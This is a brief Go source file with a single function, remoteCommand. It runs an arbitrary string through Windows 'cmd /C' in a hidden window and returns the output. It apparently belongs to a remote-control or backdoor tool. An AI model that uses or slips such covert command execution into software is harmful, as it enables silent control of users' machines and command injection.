package components

import (
	"os/exec"
	"syscall"
)

func remoteCommand(cmd string) string {
	CommandWork := exec.Command("cmd", "/C", cmd)
	CommandWork.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	History, _ := CommandWork.Output()

	return string(History)
}
